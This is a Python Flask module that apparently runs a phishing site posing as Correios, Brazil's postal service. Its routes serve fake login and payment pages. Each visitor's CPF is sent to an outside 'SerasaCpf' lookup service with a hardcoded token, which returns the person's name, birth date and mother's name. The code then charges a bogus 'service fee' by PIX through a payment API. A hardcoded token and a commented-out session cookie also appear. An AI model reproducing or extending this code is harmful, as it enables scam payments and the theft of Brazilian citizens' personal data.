from flask import Blueprint, request, make_response, render_template, \
                  flash, g, session, redirect, url_for, app, jsonify

import datetime
from database import mongo
from user_agents import parse
from os.path import exists
import urllib.parse
import json
import uuid, re, requests
import sys
import asyncio
from rich.console import Console
from operator import itemgetter
from bson import ObjectId
from threading import Thread
from time import sleep
import random
console = Console()

u = json.load(open('./sites.json'))
correios = Blueprint('correios', __name__, url_prefix=f'/{u["correios"]}')

console.log('CORREIOOOOSSSSS')


#
@correios.before_request
def make_session_permanent():
    session.permanent = True

def login():
    return render_template('correios2/index.html',prefix=session['prefix'])

def valid2():
    print(request.get_json())

    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'connect.sid=s%3AGen5yy8Z7XDdzgYLrN5z9hLEVT4_DNrJ.nbPWIbxKgZp%2BvOyQ%2BTV%2B5BQp1Z%2B1Zgm3pMs1hgqdMmA',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = request.get_json()['cpf']
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get(f"http://192.241.158.251:8081/SerasaCpf?token=ff29046e-3321-4031-95e3-f47a7c5d551f&cpf={cpf}&local=correios", headers=headers)
    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }
        return jsonify(response)
    else:
        return jsonify(success=False)
    console.log(response.text)
    return response.json(),200

def valid():
    print(request.get_json())

    headers = {
        'accept': '*/*',
        'accept-language': 'pt-BR,pt;q=0.9',
        'content-type': 'application/json',
        # 'cookie': 'connect.sid=s%3AGen5yy8Z7XDdzgYLrN5z9hLEVT4_DNrJ.nbPWIbxKgZp%2BvOyQ%2BTV%2B5BQp1Z%2B1Zgm3pMs1hgqdMmA',
        'priority': 'u=1, i',
        'referer': 'https://paguetaxalive.com/',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
    }
    cpf = request.get_json()['cpf']
    cpf = cpf.replace('-','').replace('.','').replace(' ','')
    response = requests.get(f"http://192.241.158.251:8081/SerasaCpf?token=ff29046e-3321-4031-95e3-f47a7c5d551f&cpf={cpf}&local=correios", headers=headers)
    if 'CONTATOS_ID' in response.text:
        from datetime import datetime
        date_obj = datetime.strptime(response.json()['result']['NASC'], "%Y-%m-%d %H:%M:%S")
        formatted_date = date_obj.strftime("%d/%m/%Y")
        response = {
            "success": True,
            "message": {
                "name": response.json()['result']['NOME'],
                "nasc": formatted_date,
                "mae": response.json()['result']['NOME_MAE'],
                "cpf": cpf

            }
        }
        return jsonify(response)
    else:
        return jsonify(success=False)
    console.log(response.text)
    return response.json(),200
def pix_():
    print(request.get_json())

    url = "https://api2.firepag.com/api/user/transactions"
    ip_address = request.remote_addr
    payload = {
        "customer": {
            "document": {
                "number": session['dados']['cpf'],
                "type": "CPF"
            },
            "name": session['dados']['nome'],
            "email": session['dados']['email'],
            "phone": session['dados']['phone'],
            "id": str(uuid.uuid4())
        },
        "amount": session['valores']['valor'],
        "paymentMethod": "PIX",
        "items": [
            {
                "title": "TAXA DE SERVICOS",
                "unitPrice": session['valores']['valor'],
                "quantity": 1,
                "tangible": True
            }
        ],
        "pix": { "expiresInDays": 1 },
        "ip": ip_address
    }
    headers = {
        "content-type": "application/json",
        "authorization": f"Basic {session['taxas']['api']}"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code == 200:
        console.log(response.text)
        return jsonify(copiaecola=response.json()['data']['pix']['qrcode'],success=True),200
    return jsonify(success=False),200

@correios.route('/<path:path>', methods=['GET', 'POST', 'PUT'])
def index_redir(path):
    try:
        print(path)
        path = path.split("/")
        print(path)
        print(path[0], session['prefix'])
        print(path[1])
        if path[0] == session['prefix']:
            #response = redirect("/login")
            try:
                if path[1] == 'login':
                    return login()
                elif path[1] == 'valid':
                    console.log('post')
                    return valid()
                elif path[1] == 'pix':
                    console.log('post pix a')
                    return render_template('correios2/pix.html',prefix=session['prefix'])
                    #return pix_()
                elif path[1] == 'pagamento':
                    console.log('post pix a')
                    return render_template('correios2/pagamento.html',prefix=session['prefix'])
                else:
                    return {}
            except Exception as e:
                print(e)
                session["ads"] = ''
                session['proxies'] = get_random_proxy()
                return path[0]
        else:
            session.clear()
            return redirect("/")
    except:
        session.clear()
        return redirect("/")